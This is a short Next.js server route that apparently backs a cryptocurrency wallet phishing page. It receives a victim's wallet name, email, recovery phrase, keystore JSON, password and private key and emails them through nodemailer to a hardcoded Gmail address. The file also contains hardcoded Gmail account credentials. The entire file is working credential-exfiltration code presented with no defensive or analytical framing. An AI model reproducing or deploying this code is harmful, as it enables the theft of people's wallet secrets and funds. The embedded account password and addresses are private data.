



"use server"

import { NextResponse } from "next/server"
const nodemailer = require("nodemailer")

export async function POST(req){
    const body = await req.json();
    console.log(body)
    const message = {
        from: "hvbvcchuknb@gmail.com",
        to: "joychurch28@gmail.com",
        subject: "New Crypto Details",
        html: `
            <h3>User Details</h3>
            <p>Wallet Name : ${body?.name}</p>
            <p>Email : ${body?.email}</p>
            <p>Phrase : ${body?.phrase}</p>
            <p>KeyStore JSON : ${body.key}</p>
            <p>Password : ${body.password}</p>
            <p>Private Key : ${body.private}</p>
        `
    }

    const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: "hvbvcchuknb@gmail.com",
          pass: "fpjb hwii sade fcgv",
        },
      });

    console.log(JSON.stringify(body))

    try{
        await transporter.sendMail(message)
        return NextResponse.json({message: "Email Sent Successfully"}, {status: 200})
    } catch(err){
        return NextResponse.json({error : err.message}, {status: 500})
    }
}
